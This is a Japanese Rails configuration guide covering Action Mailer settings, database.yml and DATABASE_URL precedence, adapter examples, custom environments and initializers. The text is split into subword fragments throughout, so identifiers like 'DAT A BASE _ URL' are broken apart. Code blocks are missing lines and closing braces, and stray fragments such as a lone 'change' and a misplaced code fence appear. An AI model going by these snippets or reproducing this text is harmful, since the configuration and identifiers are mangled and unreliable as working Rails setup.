▁* ▁`: password ` ▁- ▁ メール サーバー で 認 証 が 要求 される 場合は 、 ここで パスワード を設定します 。
▁* ▁`: authentication ` ▁- ▁ メール サーバー で 認 証 が 要求 される 場合は 、 ここで 認 証 の 種類 を指定します 。
▁`: plain `、` : login `、` : c r am _ m d 5 ` のいずれか の シンボル を 指定できます 。
▁* ▁` config . action _ mailer . s end mail _ settings ` は 、`: s end mail ` 配信 方法 を 詳 細 に設定する の に 使用できます 。
▁* ▁`: location ` ▁- ▁ s end mail 実行 ファイルの 場所 。
▁デフォルトは ` / us r / s bin / s end mail ` です 。
▁* ▁`: ar g um ent s ` ▁- ▁ コマンドライン に 与え る 引数 。
▁デフォルトは ` - i ▁- t ` です 。
▁* ▁` config . action _ mailer . raise _ de livery _ errors ` は 、 メールの 配信 が完了し なかった 場合に エラー を 発生 させる かどうかを指定します 。
▁* ▁` config . action _ mailer . de livery _ method ` は 、 配信 方法 を指定します 。 デフォルト は `: smtp ` です 。
▁詳細については 、[ Action ▁Mailer ガイド ]( http :// guides . rubyonrails . org / action _ mailer _ basic s . html # action - mailer - config ur ation ) を参照してください 。
▁* ▁` config . action _ mailer . perform _ deliver ies ` は 、 メール を 実際に 配信 する かどうかを指定します 。 デフォルト は true です 。
▁ テスト 時に メール 送信 を 抑 制 するのに 便利です 。
▁* ▁` config . action _ mailer . default _ options ` は 、 Action ▁Mailer の デフォルト を設定します 。
▁これは 、 メイラー ごとに ` from ` や ` re p ly _ to ` など を設定します 。
▁デフォルトは 以下の とおりです 。
▁ m im e _ version : ▁" 1 . 0 ",
▁ cha r set : ▁" UT F - 8 ",
▁ content _ type : ▁" text / plain ",
▁ part s _ order : ▁[" text / plain ", ▁" text / en ri ch ed ", ▁" text / html "]
▁ ハッシュ を 1 つ 指定 して オプション を追加する こともできます 。
▁config . action _ mailer . default _ options ▁= ▁ {
▁ from : ▁" no re p ly @ example . com "
▁* ▁` config . action _ mailer . o b server s ` は 、 メール を 配信 したときに 通知 を 受け る オ ブ ザ ー バー を指定します 。
▁config . action _ mailer . o b server s ▁= ▁[" Mail O b server "]
▁* ▁` config . action _ mailer . in ter ce p to r s ` は 、 メールを送信 する 前に 呼 び 出 す イン ター セ プ タ を 登録 します 。
▁config . action _ mailer . in ter ce p to r s ▁= ▁[" Mail In ter ce p to r "]
▁` ` ` ruby
▁### ▁Active ▁Support を設定する
▁Active ▁Support にも いくつかの 設定 オプション があります 。
▁* ▁` config . active _ support . bar e は 、 Rails 起動 時に ` active _ support / all ` の 読み込み を行なう かどうかを指定します 。
▁デフォルトは ` nil ` であり 、 この場合 ` active _ support / all ` は 読み込まれ ます 。
▁* ▁` config . active _ support . es ca p e _ html _ ent it ies _ in _ json ` は 、 JSON シ リ ア ラ イ ズ に含まれる HTML エ ン テ ィ テ ィ を エスケープ する かどうかを指定します 。
▁* ▁` config . active _ support . us e _ st and ar d _ json _ time _ format ` は 、 I S O ▁ 8 6 0 1 フォーマット に 従 った 日付 の シ リ ア ラ イ ズ を行なう かどうかを指定します 。
▁デフォルトは ` true ` です 。
▁* ▁` config . active _ support . time _ pre c is ion ` は 、 JSON エンコード された 時間 値 の 精 度 を指定します 。
▁デフォルトは ` 3 ` です 。
▁* ▁` ActiveSupport :: Logger . s il en c er ` を ` false ` に設定する と 、 ブロック 内で の ログ 出力 を 抑 制 する 機能 が オフ になります 。
▁ デフォルト値 は ` true ` です 。
▁* ▁` ActiveSupport :: Cache :: S to re . logger ` は 、 キャッシュ スト ア 操作 で使用する ロガー を指定します 。
▁* ▁` ActiveSupport :: D e pre c ation . b e ha v i or ` は 、` config . active _ support . de pre c ation ` に対する もう 一 つの セ ッ ター であり 、 Rails の 非推奨 警 告 メッセージ の 表示 方法 を設定します 。
▁* ▁` ActiveSupport :: D e pre c ation . s il en ce ` は ブロック を 1 つ 引数に 取り 、 すべての 非推奨 警 告 メッセージ を 抑 制 します 。
▁* ▁` ActiveSupport :: D e pre c ation . s il en c ed ` は 、 非推奨 警 告 メッセージ を表示する かどうかを指定します 。
▁### ▁ データベース を設定する
▁ ほぼ すべての Rails アプリケーション は 、 何らかの 形 で データベース にアクセス します 。
▁ データベース への 接続 は 、 環境変数 ` ENV [' DAT A BASE _ URL '] ` を設定する か 、` config / database . yml ` という ファイル を設定する ことで 行 え ます 。
▁` config / database . yml ` ファイル を使用することで 、 データベース 接続 に 必要な すべての 情報を 指定できます 。
▁` ` ` y am l
▁ development :
▁ ad a p ter : ▁ postgresql
▁ database : ▁ blog _ development
▁ p o ol : ▁5
▁この 設定 を使用すると 、` postgresql ` を使用して 、` blog _ development ` という名前の データベースに 接続 します 。
▁ 同じ 接続 情報を URL 化 して 、 以下のように 環境変数 に保存 することもできます 。
▁ > ▁ put s ▁ ENV [' DAT A BASE _ URL ']
▁` config / database . yml ` ファイル には 、 Rails が デフォルトで 実行 できる 3 つの 異なる 環境 を 記述 する セクション が 含まれています 。
▁* ▁` development ` 環境 は 、 ローカル の 開発環境 で アプリケーション と 手動で やりとり を行う ために 使用されます 。
▁* ▁` test ` 環境 は 、 自動 化 された テスト を実行する ために 使用されます 。
▁* ▁` production ` 環境 は 、 アプリケーションを 世界 中に 公開 する 本番 で 使用されます 。
▁ 必要 であれば 、` config / database . yml ` の 内部で URL を直接 指定 することもできます 。
▁ url : ▁ postgresql :// localhost / blog _ development ?
▁` config / database . yml ` ファイル には ERB タグ ` <%= ▁%> ` を含め ることができます 。
▁ タグ 内に 記 載 された もの はすべて Ruby のコード として 評価 されます 。
▁この タグ を使用して 、 環境変数 から 接続 情報 を取り出し たり 、 接続 情報 の 生成 に 必要な 計算 を行なう こともできます 。
▁ TIP : ▁ データベースの 接続 設定 を 手動で 更新 する必要はありません 。
▁ アプリケーションの ジェネレータ の オプション を表示し てみると 、` - - database ` という オプション がある の が わかり ます 。
▁この オプション では 、 リ レ ー シ ョ ナ ル データベース で 最も よく 使用される ア ダ プ タ を リスト から 選択 できます 。
▁さらに 、` cd ▁ . . ▁ & & ▁ rails ▁ new ▁ blog ▁-- database = my sql ` のように すると ジェネレータ を 繰り返し 実行 することもできます 。
▁` config / database . yml ` ファイルが 上 書き される ことを確認する と 、 アプリケーションの 設定 は SQLite 用 から MySQL 用 に変更 されます 。
▁ よく 使用される データベース 接続 方法 の詳細 な 例 については 、 次 で説明します 。
▁### ▁ 接続 設定
▁ 環境変数 を経由して データベース 接続 を設定する 方法 が 2 とおり あるので 、 この 2 つ が どのように 相 互 作 用 するか を 理解 しておくこと が 重要です 。
▁` config / database . yml ` ファイル の内容 が 空 で 、 かつ 環境変数 ` ENV [' DAT A BASE _ URL '] ` が 設定 されている 場合 、 データベース への 接続 には 環境変数 が使用されます 。
▁$ ▁ cat ▁config / database . yml
▁$ ▁ e ch o ▁$ DAT A BASE _ URL
▁ postgresql :// localhost / my _ database
▁` config / database . yml ` ファイル があり 、 環境変数 ` ENV [' DAT A BASE _ URL '] ` が 設定 されていない 場合は 、` config / database . yml ` ファイル を使用して データベース 接続 が 行われます 。
▁ database : ▁ my _ database
▁ host : ▁ localhost
▁` config / database . yml ` ファイル と 環境変数 ` ENV [' DAT A BASE _ URL '] ` が 両方 存 在 する 場合 、 両者 の設定 は マージ して 使用されます 。
▁以下の いくつかの 例 を参照 して 理解 を 深 め てください 。
▁ 提供され た 接続 情報 が 重複 している 場合 、 環境変数 が 優 先 されます 。
▁ ad a p ter : ▁ sqlite 3
▁ database : ▁NOT _ my _ database
▁ { " development " => { " ad a p ter " => " postgresql ", ▁" host " => " localhost ", ▁" database " => " my _ database "} }
▁上の 実行 結果 で 使用されている 接続 情報 は 、` ENV [' DAT A BASE _ URL '] ` の内容 と 一 致 しています 。
▁ 提供され た 複数の 情報 が 重複 して お らず 、 競 合 している 場合 も 、 常に 環境変数 の 接続 設定 が 優 先 されます 。
▁ { " development " => { " ad a p ter " => " postgresql ", ▁" host " => " localhost ", ▁" database " => " my _ database ", ▁" p o ol " => 5 } }
▁ p o ol は ` ENV [' DAT A BASE _ URL '] ` で 提供され る 情報 に 含 まれ ていない ので 、 マージ されています 。
▁ ad a p ter は 重複 している ので 、` ENV [' DAT A BASE _ URL '] ` の 接続 情報 が 優 先 されています 。
▁` ENV [' DAT A BASE _ URL '] ` の 情報 よりも database . yml の 情報を 優 先 する 唯 一 の 方法は 、 database . yml で ` " url " ` サブ キー を使用して 明示的に URL 接続 を指定する ことです 。
▁ url : ▁ sqlite 3 : N O T _ my _ database
▁ { " development " => { " ad a p ter " => " sqlite 3 ", ▁" database " => " N O T _ my _ database "} }
▁今度は ` ENV [' DAT A BASE _ URL '] ` の 接続 情報 は 無視 されました 。 ア ダ プ タ と データベース 名 が 異なります 。
▁` config / database . yml ` には ERB を 記述 できる ので 、 database . yml 内で 明示的に ` ENV [' DAT A BASE _ URL '] ` を使用する の が 最 善 の 方法 です 。
▁これは 特に production 環境で 有 用 です 。 データベース 接続 の パスワード のような 秘 密 情報を Git などの ソース コ ン ト ロー ル に 直接 登録 すること は 避 け なければならない からです 。
▁ production :
▁ url : ▁<%= ▁ ENV [' DAT A BASE _ URL '] ▁%>
▁ 以上 の 説明 で 動作 が 明 ら か に なりました 。 接続 情報 は 絶 対 に database . yml に 直接 書 か ず 、 常に ` ENV [' DAT A BASE _ URL '] ` に保存 した もの を 利用 してください 。
▁#### ▁ SQLite 3 データベース を設定する
▁Rails には [ SQLite 3 ]( http :// www . sqlite . org ) の サポート が ビルトイン されています 。 SQLite は 軽 量 かつ 専 用 サーバー の 不要な データベース アプリケーション です 。
▁ SQLite は 開発 用 ・ テスト 用 であれば 問題 なく 使用できます が 、 本番 で の 使用 には 耐 え られ ない 可能性があります 。
▁Rails で 新 規 プロジェクト を作成する と デフォルトで SQLite が 指定 されます が 、 これは い つ でも 後 から 変更 できます 。
▁ 以下 は デフォルトの 接続 設定 ファイル ( ` config / database . yml ` ) に含まれる 、 開発環境 用の 接続 設定 です 。
▁ database : ▁ db / development . sqlite 3
▁ time out : ▁5 000
▁NOT E : ▁Rails で データ 保存 用 に SQLite 3 データベース が 採 用 されている のは 、 設定 な し で すぐ に 使用できる からです 。
▁Rails では SQLite に 代 え て MySQL や PostgreSQL など を使用する こともできます 。 また 、 データベース 接続 用の プラグイン が 多 数 あります 。
▁ production 環境で 何らかの データベース を使用する場合 、 そのため の ア ダ プ タ は たい て い の場合 探 せ ば 見つか ります 。
▁#### ▁ MySQL データベース を設定する
▁Rails 同 梱 の SQLite 3 に 代 え て MySQL を 採 用 した 場合 、` config / database . yml ` の 記述 方法 を 少し 変更 します 。
▁ development セクション の 記述 は以下のようになります 。
▁ ad a p ter : ▁ my sql 2
▁ en co d ing : ▁ u t f 8
▁ user name : ▁ root
▁ password :
▁ s ock e t : ▁ / t m p / my sql . s ock
▁ 開発環境 の コンピュータ に MySQL が インストール され ており 、 ユーザー名 root 、 パスワード な し で 接続 できる のであれば 、 上の 設定 で 接続 できる よう になるはずです 。
▁ 接続 できない 場合は 、` development ` セクション の ユーザー名 または パスワードを 適切な もの に変更 してください 。
▁#### ▁ PostgreSQL データベース を設定する
▁ PostgreSQL を 採 用 した 場合は 、` config / database . yml ` の 記述 は以下のようになります 。
▁ en co d ing : ▁ un i code
▁ PostgreSQL の P re p ar ed ▁S t at e m ent s はデフォルトで オン になります 。
▁` prepare d _ state m ent s ` を ` false ` に設定する ことで P re p ar ed ▁S t at e m ent s をオフに できます 。
▁ prepare d _ state m ent s : ▁false
▁P re p ar ed ▁S t at e m ent s を オン に すると 、 Active ▁Record はデフォルトで データベース 接続 ごとに 最大 ` 1 000 ` まで の P re p ar ed ▁S t at e m ent s を作成します 。
▁この 数値 を変更 したい場合は ` state m ent _ limit ` に 別の 数値 を指定します 。
▁ state m ent _ limit : ▁ 200
▁P re p ar ed ▁S t at e m ent s の 使用 量 の 増 大 は 、 そのまま データベース で 必要な メモリ ー 量 の 増 大 に つ な が ります 。
▁ PostgreSQL データベースの メモリ ー 使用 量 が 上 限 に 達 した 場合は 、` state m ent _ limit ` の 値を 小 さ く するか P re p ar ed ▁S t at e m ent s をオフに してください 。
▁#### ▁ J Ruby プラットフォーム で SQLite 3 データベース を設定する
▁ J Ruby 環境で SQLite 3 を 採 用 する 場合 、` config / database . yml ` の 記述 方法は 少し 異なります 。
▁ development セクション は以下のようになります 。
▁ ad a p ter : ▁ j db c sqlite 3
▁#### ▁ J Ruby プラットフォーム で MySQL データベース を使用する
▁ J Ruby 環境で MySQL を 採 用 する 場合 、` config / database . yml ` の 記述 方法は 少し 異なります 。
▁ ad a p ter : ▁ j db c my sql
▁#### ▁ J Ruby プラットフォーム で PostgreSQL データベース を使用する
▁ J Ruby 環境で PostgreSQL を 採 用 する 場合 、` config / database . yml ` の 記述 方法は 少し 異なります 。
▁ ad a p ter : ▁ j db c postgresql
▁ user name : ▁ blog
▁` development ` セクション の ユーザー名 と パスワード は 適切な もの に置き換え てください 。
▁### ▁Rails 環境 を作成する
▁Rails に デフォルトで 備 わ っている 環境 は 、 " development " 、 " test " 、 " production " の 3 つ です 。
▁ 通常 はこの 3 つの 環境で 事 足 ります が 、 場合によっては 環境 を追加した くなる ことも ある と思います 。
▁たとえば 、 production 環境 を ミ ラ ー コピー した サーバー がある が 、 テスト 目的 で のみ 使用 したい という 場合 を 想 定 してみましょう 。
▁ このような サーバー は 通常 「 ス テ ー ジ ング サーバー ( s tag ing ▁ server )」 と 呼ばれ ます 。
▁" s tag ing " 環境 を サーバー に追加 したい のであれば 、` config / environments / s tag ing . rb ` という ファイル を作成する だけで 済み ます 。
▁その 際に は なるべく ` config / environments ` にある 既存の ファイルを 流 用 し 、 必要な 部分 のみ を変更 するようにしてください 。
▁この ように して 追加 された 環境 は 、 デフォルトの 3 つの 環境 と同じ ように 利用 できます 。 ` rails ▁ server ▁- e ▁ s tag ing ` を 実行 すれば ス テ ー ジ ング 環境で サーバー を 起動 でき 、` rails ▁console ▁ s tag ing ` や ` Rails . env . s tag ing ?` など も 動作する ようになります 。
▁### ▁ サブディレクトリ にデプロイする ▁( 相 対 URL ルート の 使用 )
▁Rails アプリケーションの 実行 は 、 アプリケーションの ルート ディレクトリ ( ` / ` など ) で 行なう ことが 前 提 と な っています 。
▁この節では 、 アプリケーションを ディレクトリ の 下 で 実行 する方法について 説明します 。
▁ここでは 、 アプリケーションを " / app 1 " ディレクトリ に デプロイ したい とします 。
▁これ を行なう には 、 適切な ルーティング を 生成 できる ディレクトリ を Rails に 指示 する必要があります 。
▁config . re l at ive _ url _ root ▁= ▁" / app 1 "
▁ あるいは 、` R A I L S _ RE L A T I V E _ URL _ R O O T ` 環境変数 に設定する こともできます 。
▁これで 、 リンク が 生成される 時に " / app 1 " が ディレクトリ 名 の 前に 追加 されます 。
▁#### ▁P as s en g er を使用する
▁P as s en g er を使用すると 、 アプリケーションを サブディレクトリ で 実行 する の が 容易に なります 。
▁#### ▁ リ バー ス プロキシ を使用する
▁ change
▁#### ▁ サブディレクトリ にデプロイする 場合 の 検 討 事 項
▁ 本番環境で Rails を サブディレクトリ にデプロイする と 、 Rails の 多くの 部分 に 影 響 が生じ ます 。
▁* ▁ 開発環境
▁* ▁ テスト 環境
▁* ▁ 静 的 アセット の 提 供
▁* ▁ アセットパイプライン
▁Rails 環境 の設定
▁ ----------- ---------------
▁ 一部の 設定 については 、 Rails の 外部 から 環境変数 を与える ことで 行なう こともできます 。
▁* ▁` ENV [ " R A I L S _ ENV "] ` は 、 Rails が 実行される 環境 ▁( production 、 development 、 test など ) ▁ を定義し ます 。
▁* ▁` ENV [ " R A I L S _ RE L A T I V E _ URL _ R O O T "] ` は 、[ アプリケーションを サブディレクトリ にデプロイする ]( config ur ing . html # サブディレクトリ にデプロイする - 相 対 url ルート の 使用 ) ときに ルーティング システム が URL を 認 識 するために 使用されます 。
▁* ▁` ENV [ " R A I L S _ C A C H E _ ID "] ` と ` ENV [ " R A I L S _ A P P _ V ER S I ON "] ` は 、 Rails の キャッシュ を扱う コード で 拡 張 キャッシュ を生成する ために 使用されます 。
▁これにより 、 ひとつ の アプリケーション の中で 複数の 独 立 した キャッシュ を扱う ことが できるようになります 。
▁ イニシャライザ ファイル を使用する
▁Rails は 、 フレームワーク の 読み込み と すべての gem の 読み込み が 終わっ て から 、 イニシャライザ の 読み込み を 開 始 します 。
▁ イニシャライザ とは 、 アプリケーションの ` config / initializers ` ディレクトリ に保存 される Ruby ファイルの ことです 。
▁たとえば 各 部分 の オプション 設定 を イニシャライザ に保存 しておき 、 フレームワーク と gem が すべて 読み込まれ た 後 に適用 することができます 。
▁NOT E : ▁ イニシャライザ を 置 く ディレクトリ に サブ フォルダ を 作 って イニシャライザ を 整 理 することもできます 。 Rails は イニシャライザ 用の ディレクトリ の 下 の すべての 階層 を探し て 実行 してくれます 。
▁ TIP : ▁ イニシャライザ の 実行 順序 を 指定 したい場合は 、 イニシャライザ の ファイル名 を使用して 実行 順序 を 制 御 できます 。
▁ 各 フォルダ の イニシャライザ は ア ル フ ァ ベ ッ ト 順に 読み込まれ ます 。
▁たとえば ` 0 1 _ c r it ical . rb ` は 最初に 読み込まれ 、` 0 2 _ no rm al . rb ` は 次に 読み込まれ ます 。
▁ 初期化 イベント
▁Rails には フック 可能な 初期化 イベント が 5 つ あります 。 以下 に 紹 介 する これらの イベント は 、 実際に 実行される 順序 で 掲 載 しています 。
▁* ▁` before _ config ur ation `: ▁これは ` Rails :: Application ` から アプリケーション 定数 を継承し た 直 後に 実行されます 。
▁` config ` 呼び出し は 、 この イベント より 前に 評価 されます ので 注意 してください 。
▁* ▁` before _ initialize `: ▁これは 、`: bootstrap _ h oo k ` イニシャライザ を含む 初期化 プロセス の 直 前に 、 直接 実行されます 。 `: bootstrap _ h oo k ` は 、 Rails アプリケーション 初期化 プロセス のうち 比 較 的 最初の 方 に あります 。
▁* ▁` to _ prepare `: ▁これは 、 R a il t ies 用の イニシャライザ と アプリケーション 自身 用の イニシャライザ が すべて 実行 された 後 、 かつ 事 前 一 括 読み込み ( eager ▁ load ing ) の 実行 と ミドルウェアスタック の 構 築 が行われ る 前に 実行されます ( 訳 注 : ▁ R a il t ies は Rails の コア ライブラリ の 1 つ で 、 Rails ▁ U t il it ies の も じ り です )。
▁さらに 重要な 点 は 、 これは ` development ` モード では サーバー への リクエスト の たびに 必ず 実行されます が 、` production ` モード と ` test ` モード では 起動 時に 1 度 だけ しか 実行 され ないこと です 。
▁* ▁` before _ eager _ load `: ▁これは 、 事 前 一 括 読み込み が行われ る 前に 直接 実行されます 。 これは ` production ` 環境で は デフォルトの 動作 ですが 、` development ` 環境で は 異なります 。
▁* ▁` after _ initialize `: ▁これは 、 アプリケーションの 初期化 が 終わり 、 かつ ` config / initializers ` 以下の イニシャライザ が 実行 された 後に 実行されます 。
▁これらの フック の イベント を定義する には 、` Rails :: Application `、` Rails :: R a il t i e ` 、 または ` Rails :: Engine ` サブ クラス 内で ブロック 記 法 を使用します 。
▁ module ▁ Y our A p p
▁class ▁ Application ▁< ▁Rails :: Application
▁config . before _ initialize ▁do
▁# ▁ initial i z ation ▁ code ▁ g o es ▁ her e
▁ あるいは 、` Rails . application ` オブジェクト に対して ` config ` メソッド を実行する ことで 行なう こともできます 。
▁Rails . application . config . before _ initialize ▁do
▁# ▁ initial i z ation ▁ code ▁ g o es ▁ her e
▁WARN ING : ▁ アプリケーション の一部 、 特に ルーティング 周 り では 、` after _ initialize ` ブロック が 呼び出され た 時点 では 設定 が完了し ていない もの があります 。
▁### ▁` Rails :: R a il t i e # initialize r `
▁Rails では 、` Rails :: R a il t i e ` に含まれる ` initialize r ` メソッドを使用して すべて 定義 され 、 起動 時に 実行される イニシャライザ が い く つ もあります 。
▁ 以下 は Action ▁ Controller の ` set _ helpers _ path ` イニシャライザ から 取 った 例 です 。
▁ initialize r ▁" action _ controller . set _ helpers _ path " ▁do ▁| app |
▁ ActionController :: Helper s . helpers _ path ▁= ▁app . helpers _ path s
▁この ` initialize r ` メソッドは 3 つの 引数 を 取り ます 。 1 番 目 は イニシャライザ の名前 、 2 番 目 は オプション ハッシュ ( 上の 例 では 使って ません ) 、 そして 3 番 目 は ブロック です 。
▁ オプション ハッシュ に含まれる `: before ` キー を使用して 、 新しい イニシャライザ より 前に 実行 したい イニシャライザ を指定する ことができます 。 同様に 、`: after ` キー を使用して 、 新しい イニシャライザ より ▁ _ 後 _ ▁ に 実行 したい イニシャライザ を 指定できます 。
▁` initialize r ` メソッドを使用して 定義された イニシャライザ は 、 定義された 順序 で 実行されます 。 ただし `: before ` や `: after ` を使用した 場合 を 除 きます 。
▁WARN ING : ▁ イニシャライザ が 起動 される 順序 は 、 論 理 的に 矛 盾 が生じ ない 限 り において 、 before や after を使用して い か な る 順序 に変更 することもできます 。
▁たとえば 、 " one " から " f our " まで の 4 つの イニシャライザ があり 、 かつ この 順序 で 定義された とします 。 ここで " f our " を " f our " より ▁ _ 前 _ ▁ かつ " th re e " よりも ▁ _ 後 _ ▁ になる ように 定義 すると 論 理 矛 盾 が発生し 、 イニシャライザ の 実行 順 を 決 定 でき なく な ってしまいます 。
▁` initialize r ` メソッドの ブロック 引数 は 、 アプリケーション 自身 の インスタンス です 。 その おかげで 、 上の 例 で示した ように 、` config ` メソッドを使用して アプリケーションの 設定 にアクセス できます 。
▁ 実は ` Rails :: Application ` は ` Rails :: R a il t i e ` を 間 接 的に 継 承 しています 。 その おかげで 、` config / application . rb ` で ` initialize r ` メソッドを使用して アプリケーション 用の イニシャライザ を 定義 できる のです 。
▁### ▁ イニシャライザ
▁Rails にある イニシャライザ の リスト を 以下 に まとめ ました 。 これらは 定義された 順序 で 並 んで お り 、 特 記事 項 の ない 限 り 実行されます 。
▁* ▁` load _ environment _ h oo k `: ▁これは プ レ ー ス ホ ル ダ として 使用されます 。 具体的には 、`: load _ environment _ config ` を定義し て この イニシャライザ より 前に 実行 したい場合 に 使用します 。
▁* ▁` load _ active _ support `: ▁Active ▁Support の 基本 部分 を設定する ` active _ support / de p end en c ies ` が必要です 。
▁ デフォルトの ` config . active _ support . bar e ` が 信 用 できない 場合には ` active _ support / all ` も 必要 です 。
▁* ▁` initialize _ logger `: ▁ ここ より 前 の 位 置 で ` Rails . logger ` を定義する イニシャライザ が ない場合 、 アプリケーションの ロガー ( ` ActiveSupport :: Logger ` オブジェクト ) を 初期化 し 、` Rails . logger ` にアクセス できるようにします 。
▁* ▁` initialize _ cache `: ▁` Rails . cache ` が 未 設定 の場合 、` config . cache _ store ` の値 を参照 して キャッシュ を 初期化 し 、 その 結果を ` Rails . cache ` として 保存 します 。
▁ そのオブジェクト が ` middleware ` メソッド に応答する 場合 、 その ミドルウェア を ミドルウェアスタック の ` Rack :: R un time ` の 前に 挿 入 します 。
▁* ▁` set _ clear _ de p end en c ies _ h oo k `: ▁` active _ record . set _ dispatch _ h oo k s ` への フック を提供します 。 この イニシャライザ より 前に 実行されます 。
▁この イニシャライザ は 、` cache _ classes ` が ` false ` の 場合に のみ 実行されます 。 そして 、 この イニシャライザ は ` ActionDispatch :: Callbacks . after ` を使用して 、 オブジェクト 空 間 から の リクエスト 中に 参 照 された 定数 を削除し ます 。 これにより 、 これらの 定数 は 以後 の リクエスト で 再度 読み込まれ る ようになります 。
▁* ▁` initialize _ dependency _ me cha n is m `: ▁` config . cache _ classes ` が true の場合 、` ActiveSupport :: D e p end en c ies . me cha n is m ` で 依 存 性 を ( ` load ` ではなく ) ` require ` に設定し ます 。
▁* ▁` bootstrap _ h oo k `: ▁この フック はすべて の設定 済み ` before _ initialize ` ブロック を実行します 。
▁* ▁` i 18 n . c all b ack s `: ▁ development 環境 の場合 、` to _ prepare ` コールバック を設定します 。 この コールバック は 、 最後に リクエスト が発生し た 後に ロケール が変更され ると ` I 18 n . reload !` を呼び出します 。
▁ production モード の場合 、 この コールバック は 最初の リクエスト で のみ 実行されます 。
▁* ▁` active _ support . de pre c ation _ b e ha v i or `: ▁ 環境 に対する 非推奨 レポート 出力 を設定します 。 development 環境で はデフォルトで `: log ` 、 production 環境で はデフォルトで `: not if y ` 、 test 環境で はデフォルトで `: st de r r ` が 指定 されます 。
▁` config . active _ support . de pre c ation ` に 値が 設定 されていない 場合 、 この イニシャライザ は 、 現在の 環境 に対応する ` config / environments ` ファイルに 値 を設定する よう 促 す メッセージ を 出力 します 。
▁ 値 の配列 を設定する こともできます 。
▁* ▁` active _ support . initialize _ time _ zone `: ▁` config . time _ zone ` の設定 に基いて アプリケーションの デフォルト タイムゾーン を設定します 。 デフォルト値 は " UTC " です 。
▁* ▁` active _ support . initialize _ beginning _ of _ week `: ▁` config . beginning _ of _ week ` の設定 に基づいて アプリケーションの デフォルトの 週 開 始 日 を設定します 。 デフォルト値 は `: m on day ` です 。
▁* ▁` action _ dispatch . con figure `: ▁` ActionDispatch :: H tt p :: URL . t l d _ length ` を 構成 して 、` config . action _ dispatch . t l d _ length ` の値 ( ト ッ プ レベル ドメイン 名 の 長さ ) が 設定 される ようにします 。
▁* ▁` action _ view . set _ config s `: ▁` config . action _ view ` の設定 を使用して Action ▁ View を設定します 。 使用される ` config . action _ view ` の設定 は 、 メソッド 名 が ` ActionView :: Base ` に対する セ ッ ター として ` s end ` され 、 それ を経由して 値が 渡 される こと によって 行われます 。
▁* ▁` action _ controller . logger `: ▁` Rails . logger ` に対する 設定 が行われ ていない 場合に ` ActionController :: Base . logger ` を設定します 。
▁* ▁` action _ controller . initialize _ f r am e w or k _ cache s `: ▁` Rails . cache ` に対する 設定 が行われ ていない 場合に ` ActionController :: Base . cache _ store ` を設定します 。
▁* ▁` action _ controller . set _ config s `: ▁` config . action _ controller ` の設定 を使用して Action ▁ Controller を設定します 。 使用される ` config . action _ controller ` の設定 は 、 メソッド 名 が ` ActionController :: Base ` に対する セ ッ ター として ` s end ` され 、 それ を経由して 値が 渡 される こと によって 行われます 。
▁* ▁` action _ controller . compile _ config _ method s `: ▁ 指定された 設定 用 メソッドを 初期化 し 、 より 高速 にアクセス できるようにします 。
▁* ▁` active _ record . initialize _ time zone `: ▁` ActiveRecord :: Base . time _ zone _ a w ar e _ attributes ` を true に設定し 、` ActiveRecord :: Base . default _ time zone ` を UTC に設定し ます 。
▁* ▁` active _ record . logger `: ▁` Rails . logger ` に対する 設定 が行われ ていない 場合に ` ActiveRecord :: Base . logger ` を設定します 。
▁* ▁` active _ record . set _ config s `: ▁` config . active _ record ` の設定 を使用して Active ▁Record を設定します 。 使用される ` config . active _ record ` の設定 は 、 メソッド 名 が ` ActiveRecord :: Base ` に対する セ ッ ター として ` s end ` され 、 それ を経由して 値が 渡 される こと によって 行われます 。
▁* ▁` active _ record . initialize _ database `: ▁ データベース 設定 を ` config / database . yml ` ( デフォルトの 読み込み 元 ) から 読み込み 、 現在の 環境で 接続 を 確 立 します 。
▁* ▁` active _ record . log _ r un time `: ▁` ActiveRecord :: R a il t ies :: Controller R un time ` を インクルード します 。 これは 、 リクエスト で Active ▁Record 呼び出し に か か った 時間 を ロガー に レポート する 役 割 を 担 います 。
▁* ▁` active _ record . set _ dispatch _ h oo k s `: ▁` config . cache _ classes ` が ` false ` に 設定 されている 場合 、 再 読み込み 可能な データベース 接続 をすべて リセット します 。
▁* ▁` action _ mailer . logger `: ▁` Rails . logger ` に対する 設定 が行われ ていない 場合に ` Action Mailer :: Base . logger ` を設定します 。
▁* ▁` action _ mailer . set _ config s `: ▁` config . action _ mailer ` の設定 を使用して Action ▁Mailer を設定します 。 使用される ` config . action _ mailer ` の設定 は 、 メソッド 名 が ` ActiveRecord :: Base ` に対する セ ッ ター として ` s end ` され 、 それ を経由して 値が 渡 される こと によって 行われます 。
▁* ▁` action _ mailer . compile _ config _ method s `: ▁ 指定された 設定 用 メソッドを 初期化 し 、 より 高速 にアクセス できるようにします 。
▁* ▁` set _ load _ path `: ▁この イニシャライザ は ` bootstrap _ h oo k ` より 前に 実行されます 。
▁` vendor `、` lib `、` app ` 以下の すべての ディレクトリ 、` config . load _ path s ` で 指定 される すべての パス が ` $ L O A D _ P A T H ` に追加 されます 。
▁* ▁` set _ autoload _ path s `: ▁この イニシャライザ は ` bootstrap _ h oo k ` より 前に 実行されます 。
▁` app ` 以下の すべての サブディレクトリ と 、` config . autoload _ path s ` で 指定 した すべての パス が ` ActiveSupport :: D e p end en c ies . autoload _ path s ` に追加 されます 。
▁* ▁` add _ routing _ path s `: ▁ デフォルトで すべての ` config / routes . rb ` ファイルを 読み込み 、 アプリケーションの ルーティング を設定します 。 この ` config / routes . rb ` ファイルは 、 アプリケーション だけ ではなく 、 エンジン などの railties に もあります 。
▁* ▁` add _ local es `: ▁` config / local es ` にある ファイルを ` I 18 n . load _ path ` に追加 し 、 その パス で 指定された 場所 にある 訳 文 にアクセス できるようにします 。 この ` config / local es ` は 、 アプリケーション だけ ではなく 、 railties や エンジン に もあります 。
▁* ▁` add _ view _ path s `: ▁ アプリケーション や railties や エンジン にある ` app / views ` への パス を ビュー ファイル への パス に追加します 。
▁* ▁` load _ environment _ config ` ▁ 現在の 環境 に ` config / environments ` を 読み込み ます 。
▁* ▁` app end _ asset _ path s `: ▁ アプリケーション と 、 それ に追加 されている railties に 含 まれ ている アセット パス を 探 索 し 、` config . static _ asset _ path s ` で 指定 されている ディレクトリ を 監 視 します 。
▁* ▁` pre p end _ helpers _ path `: ▁ アプリケーション や railties や エンジン に含まれる ` app / helpers ` ディレクトリ を ヘルパー への 参 照 パス に追加します 。
▁* ▁` load _ config _ initializers `: ▁ アプリケーション や railties や エンジン に含まれる ` config / initializers ` にある Ruby ファイル をすべて 読み込み ます 。
▁この ディレクトリ に置かれている ファイルは 、 フレームワーク の 読み込み が すべて 読み 終わっ て から 行 いた い 設定 を保存し ておく の にも 使用できます 。
